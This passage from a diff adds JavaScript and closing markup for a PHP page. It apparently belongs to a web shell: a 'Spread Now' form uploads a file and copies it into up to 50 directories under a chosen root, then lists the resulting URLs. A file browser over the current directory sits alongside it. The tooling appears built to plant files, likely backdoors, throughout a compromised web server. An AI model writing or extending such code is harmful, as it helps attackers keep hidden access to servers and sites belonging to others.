+$('#spreadForm').on('submit', function(e){
+  e.preventDefault();
+  var file=document.getElementById('sp-file').files[0];
+  if(!file){ notify('Select a file first','err'); return; }
+  var root=$('#sp-root').val().trim();
+  if(!root){ notify('Enter a root path','err'); return; }
+  var countVal=parseInt($('#sp-count').val(),10);
+  if(isNaN(countVal)||countVal<1) countVal=1; if(countVal>50) countVal=50;
+  $('#spBtn').prop('disabled',true).html('<i class="fas fa-circle-notch fa-spin"></i> Spreading...');
+  $('#spProg').show(); $('#spBar').css('width','15%');
+  $('#spStat').show().html('Scanning <span style="color:var(--a)">'+he(root)+'</span> — target <b>'+countVal+'</b> file(s)...');
+  $('#spLog').hide();
+  var fd=new FormData(); fd.append('action','spread'); fd.append('file',file); fd.append('root',root); fd.append('count',countVal);
+  $.ajax({
+    url:SELF, method:'POST', data:fd, processData:false, contentType:false, dataType:'json',
+    xhr:function(){ var x=$.ajaxSettings.xhr(); if(x.upload) x.upload.addEventListener('progress',function(ev){ if(ev.lengthComputable){ var pct=Math.min(75,Math.round(ev.loaded/ev.total*75)); $('#spBar').css('width',pct+'%'); } },false); return x; },
+    success:function(r){
+      $('#spBar').css('width','100%'); setTimeout(function(){ $('#spProg').hide(); },400);
+      if(!r||!r.ok){ $('#spStat').html('<span style="color:var(--r)"><i class="fas fa-times-circle" style="margin-right:4px"></i>'+(r&&r.msg?he(r.msg):'Spread failed')+'</span>'); $('#spBtn').prop('disabled',false).html('<i class="fas fa-broadcast-tower"></i> Spread Now'); return; }
+      var ok=r.spread||0,fail=r.failed||0,res=r.results||[],branches=r.total_branches||0,requested=r.count_requested||countVal;
+      $('#spStat').html('Spread <b>'+ok+'</b> / <b>'+requested+'</b> file'+(requested!==1?'s':'')+(branches?' across <b>'+branches+'</b> branch'+(branches!==1?'es':''):'')+( fail>0?' — <span style="color:var(--r)">'+fail+' failed</span>':''));
+      $('#spLogCount').html('<span>'+res.length+'</span>');
+      var html='';
+      res.forEach(function(item){
+        if(item.ok){
+          var ds=item.dir?item.dir.replace(/\\/g,'/').split('/').slice(-4).join('/'):'';
+          html+='<div class="sl-item"><div class="sl-fname"><i class="fas fa-folder-open" style="margin-right:4px;opacity:.4;color:var(--d2)"></i><span style="color:var(--d);font-size:9px">.../'+(ds?he(ds):'?')+'</span></div><div class="sl-fname" style="margin-top:1px"><i class="fas fa-file-code" style="margin-right:4px;opacity:.5"></i>'+he(item.fname)+'</div><div class="sl-url" onclick="copyUrl(this.dataset.url)" data-url="'+he(item.url)+'" title="Click to copy"><i class="fas fa-link" style="margin-right:4px;opacity:.5;font-size:9px"></i>'+he(item.url)+'</div></div>';
+        } else {
+          var ds2=item.dir?item.dir.replace(/\\/g,'/').split('/').slice(-4).join('/'):'';
+          html+='<div class="sl-item"><div class="sl-fname"><i class="fas fa-folder-open" style="margin-right:4px;opacity:.4;color:var(--d2)"></i><span style="color:var(--d);font-size:9px">.../'+(ds2?he(ds2):'?')+'</span></div><div class="sl-fname" style="margin-top:1px"><i class="fas fa-file-code" style="margin-right:4px;opacity:.5"></i>'+he(item.fname)+'</div><div class="sl-fail"><i class="fas fa-times-circle" style="margin-right:4px"></i>Failed</div>'+(item.err?'<div class="sl-err">'+he(item.err)+'</div>':'')+'</div>';
+        }
+      });
+      $('#spLogItems').html(html); $('#spLog').show();
+      $('#spBtn').prop('disabled',false).html('<i class="fas fa-broadcast-tower"></i> Spread Again');
+    },
+    error:function(){ $('#spProg').hide(); $('#spStat').html('<span style="color:var(--r)"><i class="fas fa-times-circle" style="margin-right:4px"></i>Network error</span>'); $('#spBtn').prop('disabled',false).html('<i class="fas fa-broadcast-tower"></i> Spread Now'); }
+  });
+});
+function copyUrl(url){
+  if(navigator.clipboard){ navigator.clipboard.writeText(url).then(function(){ notify('URL copied'); }); }
+  else { var ta=document.createElement('textarea'); ta.value=url; document.body.appendChild(ta); ta.select(); document.execCommand('copy'); document.body.removeChild(ta); notify('URL copied'); }
+}
+$(function(){ buildNav(CWD); loadFiles(); updNB(); });
+</script>
+</body>
+</html>
+<?php ob_end_flush(); ?>
